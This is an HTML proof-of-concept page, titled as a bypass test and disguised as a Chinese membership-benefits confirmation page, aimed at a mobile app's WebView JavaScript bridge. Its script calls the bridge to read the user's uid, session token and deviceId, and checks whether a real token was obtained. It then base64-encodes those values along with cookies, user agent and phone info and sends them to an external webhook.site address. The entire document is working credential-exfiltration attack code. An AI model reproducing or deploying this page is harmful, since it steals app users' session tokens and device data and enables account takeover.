<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>会员权益确认</title>
<style>
 body{background:#0d1117;color:#c9d1d9;font-family:monospace;margin:0;padding:12px;font-size:14px}
 h3{color:#58a6ff;margin:6px 0}
 .card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:10px;margin:10px 0}
 .card h4{margin:0 0 8px 0;color:#7ee787;font-size:13px;font-weight:normal}
 .row{margin:4px 0;line-height:1.5;word-break:break-all}
 .k{color:#8b949e}.v{color:#c9d1d9}.hl{color:#f2cc60}.ok{color:#3fb950}.red{color:#f85149}
</style></head>
<body>
<h3>[PoC] BYPASS TEST - XM-POC-BYPASS-V1</h3>
<div class="card"><h4>当前URL（Chromium规范化后）</h4><div class="row" id="u"></div></div>
<div class="card"><h4>appReady 返回</h4><div class="row" id="cred"><span class="k">读取中...</span></div></div>
<div class="card"><h4>判定</h4><div class="row" id="verdict"><span class="k">分析中...</span></div></div>
<script>
function b64(s){return btoa(unescape(encodeURIComponent(s)));}
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;');}
document.getElementById('u').textContent=location.href;
var ar={},pi='';
try{ar=JSON.parse(jscall.appReady());}catch(e){ar={err:''+e};}
try{pi=String(jscall.getPhoneInfo());}catch(e){pi='ERR:'+e;}
var tk=String(ar.token||'');
var isFake=tk.indexOf('S2JZdzVCei')===0;
document.getElementById('cred').innerHTML=
 'uid: '+esc(ar.uid)+'<br>token长度: '+tk.length+'<br>token前缀: <span class="hl">'+esc(tk.slice(0,24))+'</span><br>deviceId: '+esc(ar.deviceId);
document.getElementById('verdict').innerHTML= isFake
 ? '<span class="red">[X] 仍是 fakeToken（绕过未生效）</span>'
 : (tk.length>0 ? '<span class="ok">[√] token与前缀特征不符 —— 疑似真实token，绕过生效！</span>' : '<span class="red">token为空</span>');
var rep={src:'bypass-v1',href:location.href,ua:navigator.userAgent,cookie:document.cookie,appready:JSON.stringify(ar),phoneinfo:pi};
new Image().src='https://webhook.site/5f2d3f7d-943e-4e9e-bdd7-8fffa0e8cddd?tag=bypass&d='+b64(JSON.stringify(rep));
</script></body></html>
